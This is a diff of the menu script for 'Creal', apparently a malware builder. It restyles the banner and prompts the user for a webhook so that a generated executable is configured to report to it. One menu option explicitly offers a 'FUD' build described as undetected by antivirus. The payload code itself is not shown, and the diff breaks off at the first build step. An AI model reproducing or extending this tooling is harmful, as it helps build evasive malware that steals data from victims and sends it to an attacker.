@@ -1,42 +1,57 @@
-from pystyle import Write, Colors
+from pystyle import *
 import os
 import subprocess
 import requests
-from colorama import Fore, Style
+from colorama import *
 import time
-
-intro = """
-
-  /$$$$$$  /$$$$$$$  /$$$$$$$$  /$$$$$$  /$$             /$$
- /$$__  $$| $$__  $$| $$_____/ /$$__  $$| $$            | $$
-| $$  \__/| $$  \ $$| $$      | $$  \ $$| $$            | $$
-| $$      | $$$$$$$/| $$$$$   | $$$$$$$$| $$            | $$
-| $$      | $$__  $$| $$__/   | $$__  $$| $$            |__/
-| $$    $$| $$  \ $$| $$      | $$  | $$| $$                
-|  $$$$$$/| $$  | $$| $$$$$$$$| $$  | $$| $$$$$$$$       /$$
- \______/ |__/  |__/|________/|__/  |__/|________/      |__/
-                                                            
-                                                            
-                 by ayhu & artonus                                         
-
-"""
-
-Write.Print(intro, Colors.blue_to_green, interval=0.01)
-
-time.sleep(1)
 
 os.system('clear' if os.name == 'posix' else 'cls')
 
+intro = """
+
+ ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀▀▄     
+█ █    ▌ █   █   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █      
+▐ █      ▐  █▀▀█▀    █▄▄▄▄▄    █▄▄▄█ ▐    █         by ayhu & artonus
+  █       ▄▀    █    █    ▌   ▄▀   █     █       
+ ▄▀▄▄▄▄▀ █     █    ▄▀▄▄▄▄   █   ▄▀    ▄▀▄▄▄▄▄▄▀ 
+█     ▐  ▐     ▐    █    ▐   ▐   ▐     █         
+▐                   ▐                  ▐         
+
+                > Press Enter                                         
+
+"""
+
+Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.035, enter=True)
+
+
+print(f"""{Fore.LIGHTRED_EX}
+
+ ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀▀▄     
+█ █    ▌ █   █   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █      
+▐ █      ▐  █▀▀█▀    █▄▄▄▄▄    █▄▄▄█ ▐    █         by ayhu & artonus
+  █       ▄▀    █    █    ▌   ▄▀   █     █       
+ ▄▀▄▄▄▄▀ █     █    ▄▀▄▄▄▄   █   ▄▀    ▄▀▄▄▄▄▄▄▀ 
+█     ▐  ▐     ▐    █    ▐   ▐   ▐     █         
+▐                   ▐                  ▐    
+
+            Welcome to builder
+
+""")
+
+time.sleep(1)
+
+
 while True:
     
-    Write.Print("\nWhich option do you want to choose?", Colors.blue_to_green)
-    Write.Print("\n1. Build Exe", Colors.blue_to_green)
-    Write.Print("\n2. Build Fud Exe", Colors.blue_to_green)
-    Write.Print("\n3. Close", Colors.blue_to_green)
+    Write.Print("\nWhich option do you want to choose: ", Colors.red_to_yellow)
+    Write.Print("\n1. Build Exe", Colors.red_to_yellow)
+    Write.Print("\n2. Build FUD Exe (Virus programs undetected)", Colors.red_to_yellow)
+    Write.Print("\n3. Close", Colors.red_to_yellow)
     Write.Print("\nMake your selection: ", Colors.red_to_yellow, end="")
     choice = input()
 
     if choice == "1":
+        os.system("cls || clear")
         webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)
 
         filename = "Creal.py"
